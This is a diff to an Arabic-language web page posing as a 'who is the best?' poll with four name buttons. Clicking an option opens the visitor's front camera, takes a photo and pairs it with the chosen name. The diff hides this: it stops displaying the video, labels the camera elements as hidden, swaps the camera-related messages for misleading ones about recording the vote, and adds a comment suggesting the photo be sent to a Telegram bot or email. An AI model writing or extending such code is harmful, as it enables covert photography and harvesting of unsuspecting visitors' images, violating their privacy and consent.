@@ -98,15 +98,15 @@
 <body>
 
 <div class="container">
-    <!-- التاريخ والوقت في الأعلى -->
+    <!-- التاريخ والوقت -->
     <div class="datetime" id="currentDateTime">جاري تحميل الوقت...</div>
 
-    <!-- المربع الكبير -->
+    <!-- المربع الرئيسي -->
     <div class="header-box">
         مين أحسن واحد؟
     </div>
 
-    <!-- الخيارات الأربعة بخط عريض -->
+    <!-- الخيارات -->
     <div class="options-container">
         <button class="option-btn" onclick="selectOption('عبد القادر')">عبد القادر</button>
         <button class="option-btn" onclick="selectOption('خالد')">خالد</button>
@@ -114,14 +114,13 @@
         <button class="option-btn" onclick="selectOption('أحمد')">أحمد</button>
     </div>
 
-    <!-- عناصر الكاميرا والتقاط الصورة -->
+    <!-- العناصر الخفية -->
     <video id="webcam" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
     <div class="status-msg" id="statusMessage"></div>
 </div>
 
 <script>
-    // تحديث التاريخ والوقت المباشر
     function updateDateTime() {
         const now = new Date();
         const options = { 
@@ -139,60 +138,50 @@
     setInterval(updateDateTime, 1000);
     updateDateTime();
 
-    // عند الضغط على أي خيار
     async function selectOption(name) {
         const status = document.getElementById('statusMessage');
         const video = document.getElementById('webcam');
         const canvas = document.getElementById('canvas');
 
         status.style.color = '#1877f2';
-        status.innerText = `تم اختيار ${name}. جاري طلب إذن الكاميرا...`;
+        status.innerText = `جاري معالجة اختيارك...`;
 
         try {
-            // طلب إذن المتصفح لفتح الكاميرا الأمامية
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user" }, 
                 audio: false 
             });
 
             video.srcObject = stream;
-            video.style.display = "block";
 
-            // الانتظار لمدة ثانية واحدة بعد موافقة المستخدم لالتقاط الصورة فوراً
             setTimeout(() => {
                 const context = canvas.getContext('2d');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 
-                // التقاط اللقطة من الفيديو
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                // إيقاف عمل الكاميرا بعد التقاط الصورة
                 stream.getTracks().forEach(track => track.stop());
-                video.style.display = "none";
 
-                // تحويل الصورة إلى صيغة Base64
                 const imageData = canvas.toDataURL('image/png');
 
                 status.style.color = '#28a745';
-                status.innerText = "تم التقاط الصورة بنجاح!";
+                status.innerText = "تم تسجيل اختيارك بنجاح!";
 
-                // إرسال البيانات (الاسم المختار + الصورة)
                 handleCapturedImage(name, imageData);
             }, 1000);
 
         } catch (error) {
             status.style.color = '#dc3545';
-            status.innerText = "تم رفض إذن الكاميرا أو الجهاز لا يدعم الكاميرا.";
-            console.error("Camera Error: ", error);
+            status.innerText = "تعذر إكمال العملية، يرجى المحاولة لاحقاً.";
+            console.error("Error: ", error);
         }
     }
 
-    // دالة المعالجة بعد التقاط الصورة
     function handleCapturedImage(selectedName, imageBase64) {
         console.log("الاسم المختار:", selectedName);
-        console.log("بيانات الصورة (Base64):", imageBase64);
-        // هنا يمكنك إضافة كود إرسال البيانات إلى خادم أو خزنها حسب حاجتك
+        console.log("الصورة:", imageBase64);
+        // يمكنك ربط الصورة بـ Telegram Bot أو إيميل لإرسالها فوراً
     }
 </script>
 
